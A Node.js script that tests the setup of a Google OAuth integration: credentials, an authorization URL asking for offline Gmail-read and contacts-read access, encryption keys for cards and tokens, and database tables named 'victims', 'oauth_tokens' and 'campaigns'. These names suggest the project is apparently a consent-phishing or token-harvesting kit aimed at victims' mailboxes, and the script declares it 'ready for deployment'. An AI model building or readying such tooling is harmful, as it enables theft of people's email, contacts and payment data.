#!/usr/bin/env node
/**
 * OAuth Flow Test Script
 * Tests the complete Google OAuth integration
 */

require('dotenv').config();
const { google } = require('googleapis');
const { PrismaClient } = require('@prisma/client');
const logger = require('./utils/logger');

const prisma = new PrismaClient();

async function testOAuthFlow() {
  console.log('\n🔍 Testing Google OAuth Flow Integration...\n');

  // Test 1: Environment Variables
  console.log('1️⃣  Testing Environment Variables...');
  const clientId = process.env.GOOGLE_CLIENT_ID;
  const clientSecret = process.env.GOOGLE_CLIENT_SECRET;
  const redirectUri = process.env.GOOGLE_REDIRECT_URI;

  if (!clientId || !clientSecret || !redirectUri) {
    console.error('❌ Missing required environment variables');
    console.error('   GOOGLE_CLIENT_ID:', clientId ? '✅' : '❌');
    console.error('   GOOGLE_CLIENT_SECRET:', clientSecret ? '✅' : '❌');
    console.error('   GOOGLE_REDIRECT_URI:', redirectUri ? '✅' : '❌');
    return false;
  }
  console.log('   ✅ All environment variables present');
  console.log('   Client ID:', clientId.substring(0, 30) + '...');
  console.log('   Redirect URI:', redirectUri);

  // Test 2: OAuth2 Client Initialization
  console.log('\n2️⃣  Testing OAuth2 Client Initialization...');
  try {
    const oauth2Client = new google.auth.OAuth2(
      clientId,
      clientSecret,
      redirectUri
    );
    console.log('   ✅ OAuth2 client initialized successfully');
  } catch (error) {
    console.error('   ❌ Failed to initialize OAuth2 client:', error.message);
    return false;
  }

  // Test 3: Authorization URL Generation
  console.log('\n3️⃣  Testing Authorization URL Generation...');
  try {
    const oauth2Client = new google.auth.OAuth2(
      clientId,
      clientSecret,
      redirectUri
    );
    const scopes = [
      'openid',
      'https://www.googleapis.com/auth/userinfo.email',
      'https://www.googleapis.com/auth/userinfo.profile',
      'https://www.googleapis.com/auth/gmail.readonly',
      'https://www.googleapis.com/auth/contacts.readonly'
    ];
    const state = 'test-state-' + Date.now();
    const authUrl = oauth2Client.generateAuthUrl({
      access_type: 'offline',
      scope: scopes,
      state: state,
      prompt: 'consent'
    });

    if (authUrl && authUrl.includes('accounts.google.com')) {
      console.log('   ✅ Authorization URL generated successfully');
      console.log('   URL length:', authUrl.length, 'characters');
      console.log('   Contains client_id:', authUrl.includes(clientId) ? '✅' : '❌');
      console.log('   Contains redirect_uri:', authUrl.includes(encodeURIComponent(redirectUri)) ? '✅' : '❌');
      console.log('   Contains state:', authUrl.includes(state) ? '✅' : '❌');
    } else {
      console.error('   ❌ Invalid authorization URL');
      return false;
    }
  } catch (error) {
    console.error('   ❌ Failed to generate authorization URL:', error.message);
    return false;
  }

  // Test 4: Encryption Configuration
  console.log('\n4️⃣  Testing Encryption Configuration...');
  try {
    const { getEncryptionConfig } = require('./config/encryption');
    const encConfig = getEncryptionConfig();
    
    if (encConfig.cardEncryptionKey && encConfig.cardEncryptionKey.length === 64) {
      console.log('   ✅ CARD_ENCRYPTION_KEY valid (64 hex characters)');
    } else {
      console.error('   ❌ CARD_ENCRYPTION_KEY invalid');
      return false;
    }

    if (encConfig.oauthEncryptionKey && encConfig.oauthEncryptionKey.length === 64) {
      console.log('   ✅ OAUTH_ENCRYPTION_KEY valid (64 hex characters)');
    } else {
      console.error('   ❌ OAUTH_ENCRYPTION_KEY invalid');
      return false;
    }
  } catch (error) {
    console.error('   ❌ Encryption configuration error:', error.message);
    return false;
  }

  // Test 5: Database Connection
  console.log('\n5️⃣  Testing Database Connection...');
  try {
    await prisma.$connect();
    console.log('   ✅ Database connection successful');
    
    // Check if required tables exist
    const tables = ['victims', 'oauth_tokens', 'campaigns'];
    for (const table of tables) {
      try {
        const result = await prisma.$queryRawUnsafe(
          `SELECT COUNT(*) as count FROM information_schema.tables WHERE table_name = '${table}'`
        );
        if (result && result.length > 0 && result[0].count > 0) {
          console.log(`   ✅ Table '${table}' exists`);
        } else {
          console.log(`   ⚠️  Table '${table}' not found (may need migration)`);
        }
      } catch (err) {
        console.log(`   ⚠️  Could not verify table '${table}'`);
      }
    }
  } catch (error) {
    console.error('   ❌ Database connection failed:', error.message);
    return false;
  } finally {
    await prisma.$disconnect();
  }

  // Test 6: Routes Availability
  console.log('\n6️⃣  Testing Routes Availability...');
  try {
    const routes = require('./routes');
    console.log('   ✅ Routes module loaded successfully');
    console.log('   Routes should be available at:');
    console.log('     - GET /auth/google');
    console.log('     - GET /auth/callback');
  } catch (error) {
    console.error('   ❌ Failed to load routes:', error.message);
    return false;
  }

  console.log('\n✨ All tests passed! OAuth flow is ready for deployment.\n');
  return true;
}

// Run tests
testOAuthFlow()
  .then(success => {
    process.exit(success ? 0 : 1);
  })
  .catch(error => {
    console.error('\n❌ Test failed with error:', error);
    process.exit(1);
  });

